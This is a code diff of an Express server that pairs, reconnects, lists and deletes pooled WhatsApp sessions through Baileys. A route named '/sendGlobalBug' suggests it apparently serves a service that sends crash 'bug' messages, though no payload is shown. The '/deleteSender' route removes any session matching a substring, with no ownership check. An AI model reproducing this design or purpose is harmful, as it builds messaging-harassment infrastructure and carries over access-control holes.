+      globalSendersList = globalSenders.map(s => ({
+        id: s.id,
+        sessionName: s.sessionName,
+        number: s.number,
+        type: "global",
+        status: activeConnections[s.sessionName] ? "connected" : "disconnected",
+        isGlobal: true,
+        owner: s.owner
+      }));
+    }
+
+    res.json({
+      valid: true,
+      senders: [...privateSenders, ...globalSendersList],
+      privateCount: privateSenders.length,
+      globalCount: globalSendersList.length
+    });
+  } catch (err) {
+    res.status(500).json({ valid: false, message: err.message });
+  }
 });
 
-app.get("/getGlobalPairing", async (req, res) => {
-  const { key, number } = req.query;
-  const username = getUserByKey(key);
-  if (!username) return res.json({ valid: false, message: "Invalid session key" });
-
-  const db = loadDatabase();
-  const user = db.find(u => u.username === username);
-  
-  if (!user || !allowedRolesForGlobal.includes(user.role)) {
-    return res.json({ valid: false, message: "Only Owner, High, Admin, High Admin, Dev can add global senders" });
-  }
-
-  if (!number) return res.status(400).json({ error: "Number is required" });
-
+app.get("/checkGlobalSenders", (req, res) => {
   try {
-    const sessionName = `global_${number}`;
-    const sessionDir = path.join('permenmd', sessionName);
+    const { key } = req.query;
+    const username = getUserByKey(key);
+    if (!username) return res.json({ valid: false, message: "Invalid key" });
 
-    if (!fs.existsSync('permenmd')) fs.mkdirSync('permenmd');
-    if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir);
-
-    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
-    const { version } = await fetchLatestBaileysVersion();
-
-    const sock = makeWASocket({
-      auth: state,
-      printQRInTerminal: false,
-      logger: pino({ level: "silent" }),
-      version: version,
-      defaultQueryTimeoutMs: undefined,
-    });
-
-    sock.ev.on("creds.update", saveCreds);
-
-    sock.ev.on("connection.update", async (update) => {
-      const { connection, lastDisconnect } = update;
-
-      if (connection === "close") {
-        const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
-        if (!isLoggedOut) {
-          console.log(`🔄 Reconnecting global ${number}...`);
-          await waiting(3000);
-        } else {
-          delete activeConnections[sessionName];
-        }
-      } else if (connection === "open") {
-        activeConnections[sessionName] = sock;
-        const sourceCreds = path.join(sessionDir, 'creds.json');
-        const destCreds = path.join('permenmd', `${sessionName}.json`);
-        if (fs.existsSync(sourceCreds)) {
-          fs.writeFileSync(destCreds, fs.readFileSync(sourceCreds));
-        }
-        console.log(`✅ Global sender ${sessionName} connected`);
-      }
-    });
-
-    if (!sock.authState.creds.registered) {
-      await waiting(1000);
-      let code = await sock.requestPairingCode(number);
-      if (code) {
-        return res.json({ valid: true, number, pairingCode: code, isGlobal: true });
-      }
+    const db = loadDatabase();
+    const user = db.find(u => u.username === username);
+    if (!user || !canAccessGlobalSender(user)) {
+      return res.json({ valid: false, message: "Access denied" });
     }
 
     const globalSenders = loadGlobalSenders();
-    const existing = globalSenders.find(s => s.number === number);
-    
-    if (!existing) {
-      const newId = Date.now().toString();
-      globalSenders.push({
-        id: newId,
-        sessionName: sessionName,
-        number: number,
-        owner: username,
-        addedAt: new Date().toISOString()
-      });
-      saveGlobalSenders(globalSenders);
+    const statusList = globalSenders.map(sender => {
+      const isConnected = !!activeConnections[sender.sessionName];
+      const sessionPath = path.join('permenmd', sender.sessionName);
+      const hasCreds = fs.existsSync(path.join(sessionPath, 'creds.json'));
+
+      return {
+        id: sender.id,
+        number: sender.number,
+        sessionName: sender.sessionName,
+        connected: isConnected,
+        hasCreds: hasCreds,
+        owner: sender.owner,
+        addedAt: sender.addedAt
+      };
+    });
+
+    res.json({
+      valid: true,
+      total: globalSenders.length,
+      connected: statusList.filter(s => s.connected).length,
+      senders: statusList
+    });
+  } catch (err) {
+    res.status(500).json({ valid: false, message: err.message });
+  }
+});
+
+app.post("/reconnectGlobalSender", async (req, res) => {
+  try {
+    const { key, senderId } = req.body;
+    const username = getUserByKey(key);
+    if (!username) return res.json({ valid: false, message: "Invalid key" });
+
+    const db = loadDatabase();
+    const user = db.find(u => u.username === username);
+    if (!user || !canAccessGlobalSender(user)) {
+      return res.json({ valid: false, message: "Access denied" });
     }
 
-    return res.json({
-      valid: true,
-      message: "Global sender added successfully",
-      senderId: existing?.id || Date.now().toString()
-    });
+    const globalSenders = loadGlobalSenders();
+    const sender = globalSenders.find(s => s.id === senderId);
+
+    if (!sender) {
+      return res.json({ valid: false, message: "Global sender not found" });
+    }
+
+    // Close old connection
+    if (activeConnections[sender.sessionName]) {
+      try {
+        activeConnections[sender.sessionName].ws?.close();
+        delete activeConnections[sender.sessionName];
+      } catch(e) {}
+    }
+
+    await sleep(1000);
+
+    const sessionPath = 'permenmd';
+    const sock = await connectSession("permenmd", sender.sessionName);
+    if (sock) {
+      res.json({ valid: true, message: `Reconnecting ${sender.number}...`, sessionName: sender.sessionName });
+    } else {
+      res.json({ valid: false, message: "Failed to reconnect. Session may be invalid." });
+    }
+  } catch (err) {
+    res.status(500).json({ valid: false, message: err.message });
+  }
+});
+
+app.delete("/deleteSender", (req, res) => {
+  try {
+    const { key, id } = req.query;
+    const username = getUserByKey(key);
+    if (!username) return res.json({ valid: false, message: "Invalid session key" });
+
+    const db = loadDatabase();
+    const user = db.find(u => u.username === username);
+    if (!user) return res.json({ valid: false, message: "User not found" });
+
+    let deletedSession = null;
+    if (activeConnections[id]) {
+        deletedSession = id;
+    } else {
+        for (const sessionName in activeConnections) {
+            if (sessionName.includes(id)) {
+                deletedSession = sessionName;
+                break;
+            }
+        }
+    }
+
+    if (!deletedSession) return res.json({ valid: false, message: "Sender not found" });
+
+    if (activeConnections[deletedSession]) {
+      try {
+        activeConnections[deletedSession].ws?.close();
+        delete activeConnections[deletedSession];
+        delete biz[deletedSession];
+        delete mess[deletedSession];
+      } catch(e) {}
+    }
+
+    const sessionPath = path.join('permenmd', user.username, deletedSession);
+    if (fs.existsSync(sessionPath)) {
+      fs.rmSync(sessionPath, { recursive: true, force: true });
+    }
+
+    const credsFile = path.join('permenmd', `${deletedSession}.json`);
+    if (fs.existsSync(credsFile)) fs.unlinkSync(credsFile);
+
+    res.json({ valid: true, message: "Sender deleted successfully" });
+  } catch (err) {
+    res.status(500).json({ valid: false, message: err.message });
+  }
+});
+
+app.get("/getGlobalPairing", async (req, res) => {
+  try {
+    const { key, number } = req.query;
+    const username = getUserByKey(key);
+    if (!username) return res.json({ valid: false, message: "Invalid session key" });
+
+    const db = loadDatabase();
+    const user = db.find(u => u.username === username);
+
+    if (!user || !canAccessGlobalSender(user)) {
+      return res.json({ valid: false, message: "Access denied: Required role owner, admin, partner, or reseller" });
+    }
+
+    if (!number || number.length < 9) {
+        return res.status(400).json({ valid: false, message: "Valid number is required" });
+    }
+
+    const cleanNumber = number.replace(/\D/g, '');
+    const sessionName = `global_${cleanNumber}`;
+    const sessionDir = 'permenmd';
+
+    // Check if already connected
+    if (activeConnections[sessionName]) {
+        return res.json({
+            valid: true,
+            message: "Global sender already connected",
+            number: cleanNumber,
+            sessionName
+        });
+    }
+
+    const sock = await connectSession(sessionDir, sessionName);
+
+    if (sock && sock.authState.creds.registered) {
+        // Update database if registered
+        const globalSenders = loadGlobalSenders();
+        const existing = globalSenders.find(s => s.number === cleanNumber);
+
+        if (!existing) {
+          globalSenders.push({
+            id: Date.now().toString(),
+            sessionName: sessionName,
+            number: cleanNumber,
+            owner: username,
+            addedAt: new Date().toISOString()
+          });
+          saveGlobalSenders(globalSenders);
+        }
+        return res.json({ valid: true, message: "Global sender already registered", number: cleanNumber });
+    }
+
+    // If not registered, we need to request pairing code.
+    // Wait for the socket to be ready
+    await sleep(2000);
+    
+    try {
+        let code = await sock.requestPairingCode(cleanNumber);
+        if (code) {
+          // Add to pending/list
+          const globalSenders = loadGlobalSenders();
+          if (!globalSenders.find(s => s.number === cleanNumber)) {
+              globalSenders.push({
+                  id: Date.now().toString(),
+                  sessionName: sessionName,
+                  number: cleanNumber,
+                  owner: username,
+                  addedAt: new Date().toISOString()
+              });
+              saveGlobalSenders(globalSenders);
+          }
+
+          return res.json({
+              valid: true,
+              number: cleanNumber,
+              pairingCode: code,
+              isGlobal: true,
+              sessionName
+          });
+        }
+    } catch (err) {
+        return res.json({ valid: false, message: "Failed to get pairing code: " + err.message });
+    }
+
+    return res.json({ valid: false, message: "Failed to initiate pairing" });
 
   } catch (err) {
     console.error("Global pairing error:", err.message);
-    return res.status(500).json({ error: err.message });
+    return res.status(500).json({ valid: false, error: err.message });
   }
 });
 
 app.delete("/deleteGlobalSender", (req, res) => {
-  const { key, id } = req.query;
-  const username = getUserByKey(key);
-  if (!username) return res.json({ valid: false, message: "Invalid session key" });
+  try {
+    const { key, id } = req.query;
+    const username = getUserByKey(key);
+    if (!username) return res.json({ valid: false, message: "Invalid session key" });
 
-  const db = loadDatabase();
-  const user = db.find(u => u.username === username);
-  
-  if (!user || !allowedRolesForGlobal.includes(user.role)) {
-    return res.json({ valid: false, message: "Only Owner, High, Admin, High Admin, Dev can delete global senders" });
+    const db = loadDatabase();
+    const user = db.find(u => u.username === username);
+
+    if (!user || !canAccessGlobalSender(user)) {
+      return res.json({ valid: false, message: "Access denied" });
+    }
+
+    const globalSenders = loadGlobalSenders();
+    const index = globalSenders.findIndex(s => s.id === id || s.sessionName === id);
+
+    if (index === -1) {
+      return res.json({ valid: false, message: "Global sender not found" });
+    }
+
+    const removed = globalSenders.splice(index, 1)[0];
+    saveGlobalSenders(globalSenders);
+
+    if (activeConnections[removed.sessionName]) {
+      try {
+        activeConnections[removed.sessionName].ws?.close();
+        delete activeConnections[removed.sessionName];
+        delete biz[removed.sessionName];
+        delete mess[removed.sessionName];
+      } catch (e) {}
+    }
+
+    const sessionPath = path.join('permenmd', removed.sessionName);
+    if (fs.existsSync(sessionPath)) {
+      fs.rmSync(sessionPath, { recursive: true, force: true });
+    }
+
+    const credsFile = path.join('permenmd', `${removed.sessionName}.json`);
+    if (fs.existsSync(credsFile)) fs.unlinkSync(credsFile);
+
+    return res.json({ valid: true, deleted: true, message: "Global sender deleted successfully" });
+  } catch (err) {
+    res.status(500).json({ valid: false, message: err.message });
   }
-
-  const globalSenders = loadGlobalSenders();
-  const index = globalSenders.findIndex(s => s.id === id);
-  
-  if (index === -1) {
-    return res.json({ valid: false, message: "Global sender not found" });
-  }
-
-  const removed = globalSenders.splice(index, 1)[0];
-  saveGlobalSenders(globalSenders);
-
-  if (activeConnections[removed.sessionName]) {
-    try {
-      activeConnections[removed.sessionName].ws?.close();
-      delete activeConnections[removed.sessionName];
-    } catch (e) {}
-  }
-
-  const sessionPath = path.join('permenmd', removed.sessionName);
-  if (fs.existsSync(sessionPath)) {
-    fs.rmSync(sessionPath, { recursive: true, force: true });
-  }
-
-  const credsFile = path.join('permenmd', `${removed.sessionName}.json`);
-  if (fs.existsSync(credsFile)) {
-    fs.unlinkSync(credsFile);
-  }
-
-  return res.json({ valid: true, deleted: true, message: "Global sender deleted successfully" });
 });
 
 app.get("/sendGlobalBug", async (req, res) => {
@@ -4702,7 +4143,7 @@ async function connectGlobalSenders() {
       
       if (!activeConnections[sender.sessionName]) {
         console.log(`[🌐 GLOBAL] Connecting ${sender.sessionName}...`);
-        await connectSession(sessionPath, sender.sessionName);
+        await connectSession("permenmd", sender.sessionName);
       }
     } else {
       console.log(`[⚠️ GLOBAL] Session ${sender.sessionName} not found, removing`);
